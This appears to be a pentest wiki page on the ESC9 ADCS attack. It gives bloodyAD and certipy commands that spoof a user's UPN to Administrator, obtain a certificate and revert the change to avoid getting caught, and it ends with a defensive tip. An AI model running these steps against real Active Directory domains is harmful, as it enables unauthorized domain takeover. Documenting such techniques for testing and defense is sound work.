---
title: 'ESC9: The No Security Extension Spoof'
description: 'ESC9: The "No Security Extension" Spoof.'
icon: material/file-document-outline
---
# ESC9: The "No Security Extension" Spoof

ESC9 is a sneaky attack introduced to bypass Microsoft's attempt to fix ADCS vulnerabilities. 

In May 2022 (KB5014754), Microsoft introduced strong certificate mapping. Certificates now needed a special extension (`szOID_NTDS_CA_SECURITY_EXT`) that strongly binds the certificate to the specific user's SID in Active Directory.

However, if a template is explicitly configured *not* to include this extension (via the `CT_FLAG_NO_SECURITY_EXTENSION` flag), we can exploit the way Active Directory falls back to "weak mapping" using the `userPrincipalName` (UPN).

## The Attack Path

If you have generic write over another user object (say, `UserB`), you can change their UPN to match a Domain Admin, request a certificate, change their UPN back, and then use the certificate.

### 1. Find the Vulnerable Template
You need a template with `CT_FLAG_NO_SECURITY_EXTENSION` enabled, client authentication, and enrollment rights for `UserB`.

### 2. Change the UPN
Modify `UserB`'s `userPrincipalName` to match the Domain Admin.
```bash
# Set UserB's UPN to Administrator@domain.local
bloodyAD --host dc01.domain.local -d domain.local -u 'john' -p 'Pass' set object 'CN=UserB,OU=Users,DC=domain,DC=local' userPrincipalName 'Administrator@domain.local'
```

### 3. Request the Certificate
Request a certificate as `UserB`. Because the template doesn't include the strong security extension, the certificate will only be mapped using the UPN we just spoofed.
```bash
certipy req -u 'UserB' -p 'UserBPass' -ca 'domain-CA' -template 'NoSecExtTemplate'
```

### 4. Revert the UPN
Change `UserB`'s UPN back so you don't break the network and get caught.
```bash
bloodyAD --host dc01.domain.local -d domain.local -u 'john' -p 'Pass' set object 'CN=UserB,OU=Users,DC=domain,DC=local' userPrincipalName 'UserB@domain.local'
```

### 5. Authenticate
Use the certificate to authenticate. Since the KDC falls back to weak mapping (UPN), it sees `Administrator@domain.local` on the certificate and logs you in as the Domain Admin.

!!! tip
    This attack highlights why strong certificate mapping is critical. If your templates are still relying on UPN mapping, you are just one compromised account away from a domain takeover.
